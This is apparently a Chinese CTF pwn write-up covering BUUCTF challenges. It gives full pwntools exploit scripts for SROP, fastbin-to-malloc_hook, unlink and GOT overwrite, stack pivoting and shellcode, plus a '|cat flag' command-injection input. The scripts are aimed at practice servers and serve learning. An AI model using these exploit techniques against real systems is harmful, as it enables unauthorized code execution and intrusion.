<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27109</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rax_15_ret=<span class="number">0x04004DA</span></span><br><span class="line">syscall_ret=<span class="number">0x0400517</span></span><br><span class="line">read_write_ret=<span class="number">0x004004F1</span></span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(read_write_ret)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sh.sendline(pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sh.recv(<span class="number">0x20</span>)</span><br><span class="line">binsh_addr=u64(sh.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh_addr===&gt;&quot;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_execve</span><br><span class="line">frame.rdi=binsh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret</span><br><span class="line">frame_bytes = <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(rax_15_ret)+p64(syscall_ret)+frame_bytes</span><br><span class="line">sh.sendline(pal)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>首先是它一开始就给你了一个gift：栈地址</p>
<p>然后估摸是crashme\x00绕过避免改payload,然后就是溢出</p>
<p>因为这里\n会截断，所以两个想法</p>
<p>一个是shellcode写栈上</p>
<p>一个是rop链</p>
<h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>因为内存页的缘故，所以一般刚初始化的堆块起始地址末尾为00</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	首先是分配多个堆块，包括一个size为0x20堆块，以及0x90堆块，然后free chunk1，再改chunk1的fd位指向chunk2，我们是要将chunk2再次malloc，但是fastbin堆块分配的时候会有check size的检查，那么就再覆盖0x90堆块的size为0x20，之后malloc了之后改回来，然后再释放该堆块到unsortedbin，就可以Print泄露libc基址</p>
<p>​	之后便是分配堆块到malloc_hook上方，可以通过字节错位找到相应的堆块</p>
<p>fastbin中有fd的先被分配</p>
<p>以下是一些过程</p>
<p>首先要分配fastbin，就要找到合法的堆块，可以用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_fake_fast addr</span><br></pre></td></tr></table></figure>

<p>找到堆块</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211051.png" alt="image-20240308142904319"></p>
<p>填充完就这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211052.png" alt="image-20240308145448733"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28594</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : sh.sendlineafter(x,y)</span><br><span class="line">sa  = <span class="keyword">lambda</span> x,y : sh.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size=<span class="built_in">str</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index=<span class="built_in">int</span>, content=<span class="built_in">bytes</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Print</span>(<span class="params">index=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#0  00</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#1  20</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#2  40</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#3  60</span></span><br><span class="line">add(<span class="number">0x90</span>)    <span class="comment">#4  80</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line">fill(<span class="number">0</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,pal)</span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#1</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#2 in 4</span></span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>)</span><br><span class="line">fill(<span class="number">3</span>,pal)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Print(<span class="number">2</span>)</span><br><span class="line">sh.recv(<span class="number">10</span>)</span><br><span class="line">data=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;addr==========&gt;&quot;</span>,<span class="built_in">hex</span>(data))</span><br><span class="line">main_arena_addr=data-<span class="number">88</span></span><br><span class="line">malloc_hook_addr=main_arena_addr-<span class="number">0x10</span></span><br><span class="line">fake_fastbin=malloc_hook_addr-<span class="number">0x23</span>   <span class="comment">##size=7f</span></span><br><span class="line">libc_base=data-<span class="number">0x3C4B78</span></span><br><span class="line">add(<span class="number">0x90</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#10</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(fake_fastbin)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">fill(<span class="number">8</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#10 fake_fastbin</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span> </span><br><span class="line">pal=<span class="number">0x13</span>*<span class="string">b&#x27;a&#x27;</span>+p64(one_gadget)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fast===&gt;&quot;</span>,fake_fastbin)</span><br><span class="line">fill(<span class="number">10</span>,pal)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook===&gt;&quot;</span>,malloc_hook_addr)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#3C4B78</span></span><br></pre></td></tr></table></figure>

<h3 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h3><p>虽然是一道很简单的题目，但是我一开始还真的没有做出来，记住malloc之后的堆块会清空</p>
<h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p>这道题第一眼就比较神奇，因为他不能ida反编译，估计是花指令之类的，但是我不会，只能读汇编啦</p>
<p>就是一个shellcode，很简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./mrctf2020_shellcode&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29244</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Show me your magic!\n&#x27;</span>)</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p>这道题就是先格式字符串漏洞泄露canary，然后用puts(puts@got)来泄露libc基址</p>
<h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>这道题就是考察一个对于linux命令行的绕过了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)dest = <span class="string">&#x27; gnip&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please input the ip address:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line"><span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">system(dest);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里就是输入<code>|cat flag</code>即可，关于这方面的内容我就写在另一篇md上了</p>
<h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6020</span>C0:magic</span><br><span class="line"><span class="number">6020E0</span>:heap_array</span><br></pre></td></tr></table></figure>

<p>就是一个堆溢出</p>
<p>首先的思路肯定是覆盖一个大数字在magic上，然后就会想到unsortedbin attack，但是要已知fd，然后修改bk为<code>&amp;magic-0x10</code>，但是没有show类函数，搞不定？</p>
<p>那接下来就是unlink了，这个比较easy，简单说就是一个地址addr有chunk1的地址，然后修改chunk1的fd为addr-0x18，bk为addr-0x10，然后就显然了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./easyheap&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25380</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:sh.sendlineafter(x,y)</span><br><span class="line">sa  = <span class="keyword">lambda</span> x,y:sh.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span>(<span class="params"><span class="string">b&#x27;a&#x27;</span></span>)</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Content of heap : &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">magic_addr=<span class="number">0x6020C0</span></span><br><span class="line">heap_array=<span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">pal1=p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(heap_array-<span class="number">0x18</span>+<span class="number">0x10</span>)+p64(heap_array-<span class="number">0x10</span>+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)</span><br><span class="line">pal2=p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,pal2)</span><br><span class="line">edit(<span class="number">2</span>,pal1)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#2 为0x6020d8</span></span><br><span class="line">edit(<span class="number">2</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>])*<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#edit(0,b&#x27;10000000&#x27;)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这里最有病的就是后门仅仅是提供一个system的符号表。</p>
<h3 id="二解-1"><a href="#二解-1" class="headerlink" title="二解"></a>二解</h3><p>​	先申请3个堆块，index分别为0，1，2，然后释放chunk2，接着edit chunk1溢出,修改chunk1数据为&#x2F;bin&#x2F;sh(因为后面要delete chunk1 getshell)修改chunk2的fd为一处与heaparray数组接近的地方，因为这里可以错位偏移构造一个size为0x7f的fake_chunk，绕过malloc对fastbin chunk的检查，让它插进fastbins ，之后从新申请回fake_chunk，利用fake_chunk溢出修改heaparray[0]的值为free_got,最后edit chunk0(现在为free_got)为system_plt,然后delete(1)执行system(“&#x2F;bin&#x2F;sh”) getshell</p>
<p>​	跟0ctf那题有异曲同工之妙，就是构造fake_fastbin</p>
<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>首先本道题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在大多数操作系统中，BSS 段的权限通常是可读写（RW）的，但不可执行（E）。</p>
<p>所以显然就是栈迁移，有地方让我们写，然后到main里让我们得以凑齐两个leave_ret，从而可以实施</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment">#sh=process(&quot;spwn&quot;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26209</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main=<span class="number">0x08048513</span></span><br><span class="line">s_addr=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048511</span></span><br><span class="line">ret_addr=<span class="number">0x08048312</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload1=p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">sh.send(payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+p32(s_addr-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">write_addr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr=&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=LibcSearcher(&quot;write&quot;,write_addr)</span></span><br><span class="line"><span class="comment">#libc_base=write_addr-libc.dump(&quot;write&quot;)</span></span><br><span class="line"><span class="comment">#print(&quot;libc_base=&quot;,end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line">libcbase = write_addr - <span class="number">0x0d43c0</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x3a940</span></span><br><span class="line">binsh = libcbase + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload3=p32(ret_addr)+p32(system_addr)+p32(main)+p32(binsh)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这道题让我感觉很奇怪，因为我用libcsearcher找的libc不能用，但是我用网上找的偏移确实正确的</p>
<h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>这道题用的是int 80的系统调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int80(<span class="number">11</span>,<span class="string">&quot;/bin/sh&quot;</span>,null,null)</span><br></pre></td></tr></table></figure>

<p>　　后面的四个参数分别是<strong>eax</strong>、<strong>ebx</strong>、<strong>ecx</strong>、<strong>edx</strong>。</p>
